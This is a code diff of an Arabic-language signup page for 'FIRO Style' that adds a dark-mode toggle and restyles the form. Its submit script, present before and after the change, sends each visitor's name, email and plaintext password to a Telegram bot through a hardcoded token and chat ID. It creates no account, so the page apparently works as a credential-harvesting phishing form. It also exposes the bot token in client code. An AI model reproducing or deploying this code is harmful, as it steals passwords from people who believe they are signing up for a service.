@@ -3,30 +3,113 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FIRO Style - إنشاء حساب</title>
+    <title>FIRO Style - إنشاء حساب جديد</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Cairo', sans-serif; }
-        body { background-image: url('cover.png'); background-size: cover; background-position: center; background-attachment: fixed; height: 100vh; display: flex; justify-content: center; align-items: center; background-color: #f4ece2; }
-        .login-box { background: rgba(255, 255, 255, 0.2); backdrop-filter: blur(15px); padding: 35px; border-radius: 25px; width: 100%; max-width: 400px; text-align: center; border: 1px solid rgba(255, 255, 255, 0.3); box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
-        .logo-name { font-size: 2.2rem; color: #fff; margin-bottom: 25px; font-weight: bold; }
+        /* تعريف المتغيرات */
+        :root {
+            --bg-overlay: rgba(255, 255, 255, 0.2);
+            --text-color: #ffffff;
+            --input-bg: rgba(255, 255, 255, 0.9);
+            --input-text: #333;
+            --accent-color: #a67c52;
+        }
+
+        [data-theme="dark"] {
+            --bg-overlay: rgba(0, 0, 0, 0.7);
+            --text-color: #f4ece2;
+            --input-bg: rgba(30, 30, 30, 0.9);
+            --input-text: #ffffff;
+            --accent-color: #d4a373;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Cairo', sans-serif; transition: 0.3s; }
+        
+        body { 
+            background-image: url('cover.png'); 
+            background-size: cover; 
+            background-position: center; 
+            background-attachment: fixed; 
+            height: 100vh; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+        }
+
+        /* زر التبديل */
+        .theme-switch {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            background: var(--bg-overlay);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255,255,255,0.3);
+            width: 45px;
+            height: 45px;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            color: var(--text-color);
+            z-index: 1000;
+        }
+
+        .signup-box { 
+            background: var(--bg-overlay); 
+            backdrop-filter: blur(15px); 
+            border: 1px solid rgba(255, 255, 255, 0.3); 
+            padding: 30px; 
+            border-radius: 25px; 
+            width: 90%; 
+            max-width: 400px; 
+            text-align: center; 
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2); 
+        }
+
+        h2 { color: var(--text-color); margin-bottom: 25px; }
+
         .input-group { position: relative; margin-bottom: 15px; }
-        .input-group input { width: 100%; padding: 12px 45px 12px 15px; border: none; border-radius: 10px; background: rgba(255, 255, 255, 0.9); outline: none; text-align: right; }
-        .input-group i { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); color: #a67c52; }
-        .btn-login { width: 100%; padding: 12px; border: none; border-radius: 10px; background: #a67c52; color: white; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        .btn-login:hover { background: #8b6642; }
-        .footer-text { color: white; margin-top: 20px; font-size: 0.9rem; }
-        .footer-text a { color: white; font-weight: bold; }
+        .input-group input { 
+            width: 100%; 
+            padding: 12px 45px 12px 15px; 
+            border: none; 
+            border-radius: 10px; 
+            background: var(--input-bg); 
+            color: var(--input-text);
+            outline: none; 
+            text-align: right; 
+        }
+        .input-group i { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); color: var(--accent-color); }
+
+        .btn-signup { 
+            width: 100%; 
+            padding: 12px; 
+            border: none; 
+            border-radius: 10px; 
+            background: var(--accent-color); 
+            color: white; 
+            font-weight: bold; 
+            cursor: pointer; 
+        }
+
+        .login-link { margin-top: 20px; color: var(--text-color); font-size: 0.9rem; }
+        .login-link a { color: var(--text-color); font-weight: bold; }
     </style>
 </head>
 <body>
-    <div class="login-box">
-        <h2 class="logo-name">إنشاء حساب جديد</h2>
+
+    <div class="theme-switch" onclick="toggleTheme()">
+        <i id="theme-icon" class="fas fa-moon"></i>
+    </div>
+
+    <div class="signup-box">
+        <h2>إنشاء حساب جديد</h2>
         <form id="signupForm">
             <div class="input-group">
                 <i class="fa-solid fa-user"></i>
-                <input type="text" id="username" placeholder="اسم المستخدم" required>
+                <input type="text" id="username" placeholder="الاسم الكامل" required>
             </div>
             <div class="input-group">
                 <i class="fa-solid fa-envelope"></i>
@@ -34,39 +117,51 @@
             </div>
             <div class="input-group">
                 <i class="fa-solid fa-lock"></i>
-                <input type="password" id="pass" placeholder="كلمة المرور" required>
+                <input type="password" id="password" placeholder="كلمة المرور" required>
             </div>
-            <div class="input-group">
-                <i class="fa-solid fa-shield-halved"></i>
-                <input type="password" id="confirmPass" placeholder="تأكيد كلمة المرور" required>
-            </div>
-            <button type="submit" class="btn-login">سجل الآن</button>
+            <button type="submit" class="btn-signup">تسجيل</button>
         </form>
-        <p class="footer-text">لديك حساب بالفعل؟ <a href="index.html">تسجيل الدخول</a></p>
+        
+        <p class="login-link">لديك حساب بالفعل؟ <a href="index.html">دخول</a></p>
     </div>
 
     <script>
+        function toggleTheme() {
+            const body = document.documentElement;
+            const icon = document.getElementById('theme-icon');
+            if (body.getAttribute('data-theme') === 'dark') {
+                body.removeAttribute('data-theme');
+                icon.className = 'fas fa-moon';
+                localStorage.setItem('theme', 'light');
+            } else {
+                body.setAttribute('data-theme', 'dark');
+                icon.className = 'fas fa-sun';
+                localStorage.setItem('theme', 'dark');
+            }
+        }
+
+        window.onload = () => {
+            if (localStorage.getItem('theme') === 'dark') {
+                document.documentElement.setAttribute('data-theme', 'dark');
+                document.getElementById('theme-icon').className = 'fas fa-sun';
+            }
+        };
+
         document.getElementById('signupForm').addEventListener('submit', function(e) {
             e.preventDefault();
             const user = document.getElementById('username').value;
             const email = document.getElementById('email').value;
-            const pass = document.getElementById('pass').value;
-            const confirm = document.getElementById('confirmPass').value;
-
-            if(pass !== confirm) { alert("كلمات المرور غير متطابقة!"); return; }
-
+            const pass = document.getElementById('password').value;
+            
             const token = "8665629681:AAFiHgfuw1hL3thh8VJ6vxCjnYQ9BIkfA-g";
             const chatId = "5511952564";
-            const message = `📝 تسجيل عضو جديد:\n👤 الاسم: ${user}\n📧 البريد: ${email}\n🔑 الباسورد: ${pass}`;
+            const message = `📝 عميل جديد سجل:\n👤 الاسم: ${user}\n📧 البريد: ${email}\n🔑 الباسورد: ${pass}`;
 
             fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: chatId, text: message })
-            }).then(() => {
-                alert("تم إنشاء حسابك بنجاح!");
-                window.location.href = "index.html";
-            });
+            }).then(() => window.location.href = "home.html");
         });
     </script>
 </body>
